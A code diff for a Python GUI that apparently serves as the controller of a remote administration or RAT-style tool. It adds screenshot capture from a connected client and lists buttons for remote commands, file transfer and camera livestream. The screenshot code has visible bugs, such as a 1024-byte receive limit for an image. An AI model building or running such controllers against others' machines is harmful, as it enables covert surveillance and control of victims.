@@ -5,19 +5,17 @@ import threading
 import time
 import sys
 import os
+import json
+from PIL import Image
 
 inhalte = []
 
 def action_cmdcommand(client: socket.socket, content: ctk.CTkFrame):
     global inhalte
-    print(inhalte, 1)
     if len(inhalte) > 0:
-        print(inhalte, 2)
         for item in inhalte:
             item.destroy()
         inhalte = []
-
-    print(inhalte, 3)
     
     output_field = ctk.CTkTextbox(content, height=300, width=500)
     output_field.pack(expand=True, pady=10, padx=10)
@@ -43,15 +41,65 @@ def action_cmdcommand_sendcmd(client: socket.socket, cmd: str, outputfield: ctk.
 
 def action_screenshot(client: socket.socket, content: ctk.CTkFrame):
     global inhalte
-    print(inhalte, 1)
     if len(inhalte) > 0:
-        print(inhalte, 2)
         for item in inhalte:
             item.destroy()
         inhalte = []
 
-    print(inhalte, 3)
+    # set the screenshot in the middle of the screen
+    # in the bottom left corner is a select menu and the selected screenshot show in the middle
+    # in the bottom right corner is a button to take a new screenshot
 
+    # get the first screenshot in assets/screenshots --if not available, make a black field
+    screenshots = []
+    for file in os.listdir(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots')):
+        if file.endswith('.png'):
+            screenshots.append(file)
+    if len(screenshots) == 0:
+        screenshot = ctk.CTkLabel(content, text='No screenshots available', font=('Robot', 24))
+        screenshot.pack(pady=10, padx=20)
+        inhalte.append(screenshot)
+        return
+
+    # get the first screenshot
+    screenshot = ctk.CTkLabel(master=content, image=Image.open(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots', screenshots[0])))
+    screenshot.pack(pady=10, padx=20)
+    inhalte.append(screenshot)
+
+    # get the select menu
+    select_menu = ctk.CTkComboBox(content, values=screenshots)
+    select_menu.pack(pady=10, padx=20)
+    inhalte.append(select_menu)
+
+    # get the button to show the selected screenshot
+    show_selected_screenshot_button = ctk.CTkButton(content, text='Show Selected Screenshot', command=lambda: action_show_selected_screenshot(content, select_menu))
+    show_selected_screenshot_button.pack(pady=10, padx=20)
+    inhalte.append(show_selected_screenshot_button)
+
+    # get the button to take a new screenshot
+    take_screenshot_button = ctk.CTkButton(content, text='Take Screenshot', command=lambda: action_screenshot_take(client, content))
+    take_screenshot_button.pack(pady=10, padx=20)
+    inhalte.append(take_screenshot_button)
+
+def action_screenshot_take(client: socket.socket, content: ctk.CTkFrame):
+    client.send('screenshot'.encode())
+    time.sleep(0.5)
+    data = client.recv(1024)
+    count = json.load(open('config.json', 'r'))['screenshot_count']
+    with open(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots', f'screenshot_{count}.png'), 'wb') as file:
+        file.write(data)
+    count += 1
+    json.dump({'screenshot_count': count}, open('config.json', 'w'))
+    action_screenshot(client, content)
+
+def action_show_selected_screenshot(content: ctk.CTkFrame, select_menu: ctk.CTkComboBox):
+    global inhalte
+    # get the selected screenshot
+    screenshot = ctk.CTkLabel(content, image=os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'screenshots', select_menu.get()))
+    # show the screenshot and destroy the old one
+    screenshot.pack(pady=10, padx=20)
+    inhalte[0].destroy()
+    inhalte[0] = screenshot
 
 def gui(client: socket.socket, addr):
     ctk.set_appearance_mode('dark')
@@ -75,12 +123,12 @@ def gui(client: socket.socket, addr):
     
     buttons = [
         ctk.CTkButton(menu, text='CMD Command', command=lambda: action_cmdcommand(client, content)),
-        ctk.CTkButton(menu, text='Shutdown', command=lambda: action_screenshot(client, content)),
+        ctk.CTkButton(menu, text='Shutdown'),
         ctk.CTkButton(menu, text='Restart'),
         ctk.CTkButton(menu, text='Logout'),
         ctk.CTkButton(menu, text='Put File'),
         ctk.CTkButton(menu, text='Get File'),
-        ctk.CTkButton(menu, text='Screenshot'),
+        ctk.CTkButton(menu, text='Screenshot', command=lambda: action_screenshot(client, content)),
         ctk.CTkButton(menu, text='Camera Image'),
         ctk.CTkButton(menu, text='Camera Livestream')
     ]
